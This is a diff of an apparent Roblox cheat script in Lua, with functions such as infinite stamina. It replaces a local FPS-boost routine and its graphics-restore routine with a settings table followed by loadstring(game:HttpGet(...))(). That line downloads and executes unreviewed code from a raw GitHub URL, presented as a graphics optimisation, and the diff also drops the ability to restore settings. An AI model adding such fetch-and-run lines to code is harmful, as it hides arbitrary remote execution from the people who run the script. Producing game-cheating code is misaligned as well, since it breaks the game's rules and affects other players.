@@ -113,107 +113,6 @@ local function optimizeUI(instance)
     end
 end
 
-local function applyFpsBoost()
-	local g = game
-	local w = g.Workspace
-	local l = g.Lighting
-	local t = w.Terrain
-
-	if not savedSettings.Terrain then
-		savedSettings.Terrain = {
-			WaterWaveSize = t.WaterWaveSize,
-			WaterWaveSpeed = t.WaterWaveSpeed,
-			WaterReflectance = t.WaterReflectance,
-			WaterTransparency = t.WaterTransparency,
-		}
-		savedSettings.Lighting = {
-			GlobalShadows = l.GlobalShadows,
-			FogEnd = l.FogEnd,
-			Brightness = l.Brightness,
-			EnvironmentSpecularScale =  l.EnvironmentSpecularScale,
-			EnvironmentDiffuseScale =  l.EnvironmentDiffuseScale,
-		}
-		savedSettings.QualityLevel = settings().Rendering.QualityLevel
-	end
-
-	t.WaterWaveSize = 0
-	t.WaterWaveSpeed = 0
-	t.WaterReflectance = 0
-	t.WaterTransparency = 1
-	l.GlobalShadows = false
-	l.FogEnd = 9e9
-	l.Brightness = 1
-	l.EnvironmentSpecularScale = 0
-	l.EnvironmentDiffuseScale = 0
-	settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
-
-	for _, e in pairs(l:GetChildren()) do
-		if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") 
-		or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
-			e.Enabled = false
-		end
-	end
-	
-	for _, v in pairs(Lighting:GetChildren()) do
-	    if v:IsA("Sky") then
-	        v:Destroy()
-	    end
-	end
-	
-	for _, v in pairs(Lighting:GetChildren()) do
-	    if v:IsA("PostEffect") then
-	        v.Enabled = false
-	    end
-	end
-	
-	for _, obj in pairs(workspace:GetDescendants()) do
-	    if obj:IsA("Part") or obj:IsA("MeshPart") or obj:IsA("UnionOperation") then
-	        obj.CastShadow = false
-	    end
-	end
-
-	for _, v in pairs(g:GetDescendants()) do
-		optimizeInstance(v)
-	end
-	
-	for _, gui in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
-	    optimizeUI(gui)
-	end
-	
-	if setfpscap then
-		setfpscap(60)
-	end
-
-	table.insert(connections, g.DescendantAdded:Connect(optimizeInstance))
-	table.insert(connections, LocalPlayer.PlayerGui.DescendantAdded:Connect(optimizeUI))
-end
-
-local function restoreGraphics()
-	local g = game
-	local w = g.Workspace
-	local l = g.Lighting
-	local t = w.Terrain
-
-	for _, conn in ipairs(connections) do
-		if conn.Connected then conn:Disconnect() end
-	end
-	connections = {}
-
-	if savedSettings.Terrain then
-		for k, v in pairs(savedSettings.Terrain) do
-			t[k] = v
-		end
-	end
-	if savedSettings.Lighting then
-		for k, v in pairs(savedSettings.Lighting) do
-			l[k] = v
-		end
-	end
-	if savedSettings.QualityLevel then
-		settings().Rendering.QualityLevel = savedSettings.QualityLevel
-	end
-end
-
 local function infinitestam()
     local energy = LocalPlayer.Character:WaitForChild("Energy")
     energy.Changed:Connect(function()
@@ -440,9 +339,31 @@ end
 function StuffsModule:SetFpsBoost(state)
     FpsBoostEnabled = state
     if state then
-        applyFpsBoost()
-    else
-        restoreGraphics()
+        _G.Settings = {
+            Players = {
+                ["Ignore Me"] = true, -- Ignore your Character
+                ["Ignore Others"] = true -- Ignore other Characters
+            },
+            Meshes = {
+                Destroy = true, -- Destroy Meshes
+                LowDetail = true -- Low detail meshes
+            },
+            Images = {
+                Invisible = false, -- Invisible Images
+                LowDetail = true, -- Low detail images
+                Destroy = false, -- Destroy Images
+            },
+            ["No Particles"] = true, -- Disables all ParticleEmitter, Trail, Smoke, Fire and Sparkles
+            ["No Camera Effects"] = true, -- Disables all PostEffect's (Camera/Lighting Effects)
+            ["No Explosions"] = true, -- Makes Explosion's invisible
+            ["No Clothes"] = true, -- Removes Clothing from the game
+            ["Low Water Graphics"] = true, -- Removes Water Quality
+            ["No Shadows"] = true, -- Remove Shadows
+            ["Low Rendering"] = true, -- Lower Rendering
+            ["Low Quality Parts"] = true -- Lower quality parts
+        }
+
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/jaanu91/Ip/refs/heads/main/Didi"))()
     end
 end
 
